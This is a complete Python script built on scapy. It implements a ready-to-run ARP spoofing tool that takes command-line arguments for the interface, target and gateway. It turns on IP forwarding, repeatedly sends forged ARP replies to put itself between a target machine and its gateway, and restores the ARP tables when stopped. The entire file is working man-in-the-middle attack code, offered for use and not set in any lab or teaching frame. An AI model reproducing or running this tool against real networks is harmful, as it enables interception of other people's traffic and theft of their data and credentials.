#!/usr/bin/env python3
from scapy.all import *
import time
import sys
import logging
import argparse

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        self.enable_ip_forwarding()

    def enable_ip_forwarding(self):
        """Enable IP forwarding on attacker machine"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            self.logger.info("Enabled IP forwarding")
        except Exception as e:
            self.logger.error(f"Failed to enable IP forwarding: {e}")
            sys.exit(1)

    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            response = srp1(arp_request, timeout=2, verbose=False)
            if response:
                return response[Ether].src
        except Exception as e:
            self.logger.error(f"Failed to get MAC for {ip}: {e}")
        return None

    def spoof(self, target_ip, spoof_ip, target_mac):
        """Send spoofed ARP packet"""
        packet = ARP(
            op=2,  # ARP Reply
            pdst=target_ip,  # Target IP
            hwdst=target_mac,  # Target MAC
            psrc=spoof_ip  # Spoofed Source IP
        )
        send(packet, verbose=False)

    def restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Restore ARP tables"""
        packet = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        send(packet, count=4, verbose=False)
        
        packet = ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac
        )
        send(packet, count=4, verbose=False)

    def start_spoofing(self):
        """Start ARP spoofing attack"""
        try:
            target_mac = self.get_mac(self.target_ip)
            gateway_mac = self.get_mac(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                self.logger.error("Could not get MAC addresses")
                return
            
            self.logger.info(f"Target MAC: {target_mac}")
            self.logger.info(f"Gateway MAC: {gateway_mac}")
            self.logger.info("Starting ARP spoofing. Press Ctrl+C to stop.")
            
            while True:
                self.spoof(self.target_ip, self.gateway_ip, target_mac)
                self.spoof(self.gateway_ip, self.target_ip, gateway_mac)
                time.sleep(2)
                
        except KeyboardInterrupt:
            self.logger.info("Stopping ARP spoofing...")
            self.restore(self.target_ip, self.gateway_ip, target_mac, gateway_mac)
            sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool')
    parser.add_argument('-i', '--interface', required=True, help='Network interface')
    parser.add_argument('-t', '--target', required=True, help='Target IP (Client)')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP (Server)')
    args = parser.parse_args()
    
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start_spoofing()

if __name__ == "__main__":
    main()
